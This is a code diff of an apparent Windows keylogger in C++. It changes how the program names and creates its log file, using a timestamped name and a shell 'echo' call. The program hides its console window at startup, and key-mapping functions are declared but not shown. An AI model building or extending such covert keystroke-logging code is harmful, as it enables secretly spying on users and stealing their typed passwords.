@@ -2,6 +2,7 @@
 #include <windows.h>
 #include <fstream>
 #include <string>
+#include <ctime>
 using namespace std;
 
 void hideConsole(void);
@@ -9,13 +10,14 @@ int getLowerKey(int letter);
 
 int main(int nArgs, char* argv[]){
 	hideConsole();
-	string file;
-	if(argv[1] != NULL){
-		file = argv[1];
-	}
-	else{
-		file = "log.txt";
-	}
+	char file[30];
+	char command[30];
+	time_t now = time(0);
+	tm *ltm = localtime(&now);
+	sprintf(file, "log%d-%d-%d-%d.txt", (1900+ltm->tm_year),(1+ltm->tm_mon),(ltm->tm_mday),(ltm->tm_sec));
+	sprintf(command, "echo . > %s", file);
+	system(command);
+	cout<<file<<endl;
 	ofstream log;
 	log.open(file, ios::out);
 	if(log.fail()){
